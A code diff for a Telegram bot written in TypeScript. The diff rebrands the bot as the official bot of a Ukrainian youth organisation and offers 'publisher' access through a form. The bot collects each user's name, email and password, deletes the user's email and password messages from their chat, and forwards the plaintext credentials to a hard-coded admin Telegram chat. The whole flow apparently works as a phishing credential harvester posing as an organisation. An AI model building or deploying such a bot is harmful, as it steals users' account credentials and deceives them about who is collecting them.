@@ -10,26 +10,42 @@ const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN as string;
 const LOG_CHAT_ID = -1002882015877;
 
-if (!TELEGRAM_BOT_TOKEN) throw new Error("Missing TELEGRAM_BOT_TOKEN in environment variables");
+if (!TELEGRAM_BOT_TOKEN)
+  throw new Error("Missing TELEGRAM_BOT_TOKEN in environment variables");
 
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+export const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { webHook: true });
 
 // ========== Utilities ==========
-const validateEmail = (email: string): boolean => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());
-const escapeMarkdownV2 = (text: string): string => text.replace(/([_*\[\]()~`>#+=|{}.!\\-])/g, "\\$1");
+const validateEmail = (email: string): boolean =>
+  /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());
+const escapeMarkdownV2 = (text: string): string =>
+  text.replace(/([_*\[\]()~`>#+=|{}.!\\-])/g, "\\$1");
 
 // ========== State Management ==========
 type UserState = "awaiting_name" | "awaiting_email" | "awaiting_password" | null;
 const userStates = new Map<number, UserState>();
-const userData = new Map<number, { name?: string; email?: string; password?: string }>();
+const userData = new Map<number, {
+  name?: string;
+  email?: string;
+  password?: string;
+  emailMsgId?: number;
+  passwordMsgId?: number;
+}>();
 
 // ========== Start Command ==========
 bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
-  const caption = `👋 Welcome to our bot!\n\nThis is your personal authentication assistant.`;
+  const caption = `*Вас вітає офіційний телеграм-бот Патріотичної молоді України* — громадської організації, яка формує свідоме покоління українців!
 
-  bot.sendPhoto(chatId, fs.createReadStream("./public/hello.png"), {
+Наша місія — розвиток національної ідентичності, підтримка активної громадянської позиції та єднання молоді навколо спільних цінностей.
+
+*🌟 Хочеш змін? Почни з себе та стань частиною команди, яка творить майбутнє!*
+
+*📥 Заповнюй форму — і доєднуйся до нас, щоб діяти разом!*`;
+
+  await bot.sendPhoto(chatId, fs.createReadStream("./public/hello.png"), {
     caption,
+    parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
         [{ text: "🚀 Приєднатися", callback_data: "join" }],
@@ -55,10 +71,8 @@ bot.on("callback_query", async (callbackQuery) => {
 
   if (data.startsWith("accept_publisher_")) {
     const targetUserId = Number(data.replace("accept_publisher_", ""));
-
     try {
       await bot.sendMessage(targetUserId, "✅ Ваш запит було прийнято! \nВітаємо у команді!");
-      await bot.deleteMessage(chatId, messageId);
     } catch (err: any) {
       console.error("❌ Failed to notify user:", err.response?.body || err.message);
     }
@@ -67,10 +81,8 @@ bot.on("callback_query", async (callbackQuery) => {
 
   if (data.startsWith("cancel_publisher_")) {
     const targetUserId = Number(data.replace("cancel_publisher_", ""));
-
     try {
-      await bot.sendMessage(targetUserId, "❌ На жаль, Ваш запит було відхилено. Ви можете звернутись пізніше.");
-      await bot.deleteMessage(chatId, messageId);
+      await bot.sendMessage(targetUserId, "❌ Ваш запит було відхилено. Ви можете звернутись пізніше.");
     } catch (err: any) {
       console.error("❌ Failed to notify user:", err.response?.body || err.message);
     }
@@ -90,7 +102,14 @@ bot.on("callback_query", async (callbackQuery) => {
 
     case "menu":
       bot.sendPhoto(chatId, fs.createReadStream("./public/hello.png"), {
-        caption: `👋 Welcome to our bot!\n\nThis is your personal authentication assistant.`,
+        caption: `*Вас вітає офіційний телеграм-бот Патріотичної молоді України* — громадської організації, яка формує свідоме покоління українців!
+
+Наша місія — розвиток національної ідентичності, підтримка активної громадянської позиції та єднання молоді навколо спільних цінностей.
+
+*🌟 Хочеш змін? Почни з себе та стань частиною команди, яка творить майбутнє!*
+
+*📥 Заповнюй форму — і доєднуйся до нас, щоб діяти разом!*`,
+        parse_mode: "Markdown",
         reply_markup: {
           inline_keyboard: [
             [{ text: "🚀 Приєднатися", callback_data: "join" }],
@@ -117,6 +136,29 @@ bot.on("message", (msg) => {
   const text = msg.text?.trim();
   if (!text) return;
 
+  // ✅ Handle keyboard button presses
+  if (text === "🚀 Приєднатися") {
+    bot.sendMessage(chatId, "Поділіться вашим...");
+    return;
+  }
+
+  if (text === "🔐 Стати паблішером") {
+    bot.sendMessage(chatId, "Як до вас звертатись? \nВведіть, будь ласка, ваше ім'я");
+    userStates.set(chatId, "awaiting_name");
+    userData.set(chatId, {});
+    return;
+  }
+
+  if (text === "ℹ️ Про нас") {
+    bot.sendMessage(chatId, "Ми — Патріотична молодь України! Детальніше на сайті: https://pmu.org.ua");
+    return;
+  }
+
+  if (text === "❓ Підтримка") {
+    bot.sendMessage(chatId, "Звертайтесь на пошту: support@pmu.org.ua");
+    return;
+  }
+
   const state = userStates.get(chatId);
   if (!state) return;
 
@@ -133,6 +175,7 @@ bot.on("message", (msg) => {
     case "awaiting_email":
       if (validateEmail(text)) {
         data.email = text;
+        data.emailMsgId = msg.message_id;
         userData.set(chatId, data);
         userStates.set(chatId, "awaiting_password");
         bot.sendMessage(chatId, "Адресу електронної пошти додано! \nТепер придумайте пароль:");
@@ -143,11 +186,16 @@ bot.on("message", (msg) => {
 
     case "awaiting_password":
       data.password = text;
+      data.passwordMsgId = msg.message_id;
       userData.set(chatId, data);
-      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
 
+      // Delete sensitive messages
+      if (data.emailMsgId) bot.deleteMessage(chatId, data.emailMsgId).catch(() => {});
+      if (data.passwordMsgId) bot.deleteMessage(chatId, data.passwordMsgId).catch(() => {});
+
+      // Log data to admin chat
       const logMessage = `
-📝 *Новий запит:*
+📝 *Новий запит на доступ до Паблішер Центру:*
 👤 *Ім'я:* ${escapeMarkdownV2(data.name || "")}
 📧 *Email:* \`${escapeMarkdownV2(data.email || "")}\`
 🔐 *Пароль:* ||${escapeMarkdownV2(data.password || "")}||
@@ -166,17 +214,26 @@ bot.on("message", (msg) => {
         },
       });
 
+      // Notify user
       bot.sendPhoto(chatId, fs.createReadStream("./public/thanks.png"), {
-        caption: `Пароль додано! Дякуємо, ${data.name}. Ваш запит перебуває на розгляді.`,
+        caption: `Пароль додано! Дякуємо, ${data.name}.\nВаш запит перебуває на розгляді.`,
         reply_markup: {
-          inline_keyboard: [
-            [{ text: "🏠 Головне Меню", callback_data: "menu" }],
-          ],
+          inline_keyboard: [[{ text: "🏠 Головне Меню", callback_data: "menu" }]],
         },
       });
 
+      // Cleanup
       userStates.delete(chatId);
       userData.delete(chatId);
       break;
   }
 });
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
+
+if (process.env.VERCEL_URL) {
+  const url = `https://${process.env.VERCEL_URL}/api/webhook`;
+  bot.setWebHook(url);
+}
